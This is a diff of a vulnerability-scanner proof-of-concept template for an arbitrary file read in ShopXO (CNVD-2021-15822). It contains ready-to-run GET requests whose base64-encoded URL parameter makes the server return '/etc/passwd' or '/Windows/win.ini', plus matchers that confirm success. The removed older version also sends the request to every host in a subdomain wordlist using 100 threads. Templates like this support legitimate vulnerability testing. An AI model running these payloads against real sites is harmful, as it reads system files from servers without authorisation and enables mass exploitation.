@@ -1,31 +1,22 @@
 id: CNVD-2021-15822
 
 info:
-  name: ShopXO Download File Read
-  author: pikpikcu
-  severity: high
-  reference: https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog
-  tags: shopxo,lfi
+    name: ShopXO File Read
+    author: Print1n(http://print1n.top)
+    severity: high
+    reference:
+        - https://mp.weixin.qq.com/s/69cDWCDoVXRhehqaHPgYog
 
-requests:
-  - payloads:
-      Subdomains: /home/mahmoud/Wordlist/AllSubdomains.txt
-    attack: sniper
-    threads: 100
+rules:
+    Linux0:
+        request:
+            method: GET
+            path: /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=
+        expression: response.status == 200 && "root:.*?:[0-9]*:[0-9]*:".bmatches(response.body)
+    Windows0:
+        request:
+            method: GET
+            path: /public/index.php?s=/index/qrcode/download/url/L1dpbmRvd3Mvd2luLmluaQ=
+        expression: response.status == 200 && response.body.bcontains(b"extensions") && response.body.bcontains(b"for 16-bit app support")
+expression: Linux0() || Windows0()
 
-    raw:
-      - |
-        GET /public/index.php?s=/index/qrcode/download/url/L2V0Yy9wYXNzd2Q=  HTTP/1.1
-        Host: {{Subdomains}}
-        User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0
-        Content-Type: application/x-www-form-urlencoded
-    matchers-condition: and
-    matchers:
-
-      - type: regex
-        regex:
-          - "root:[x*]:0:0"
-
-      - type: status
-        status:
-          - 200
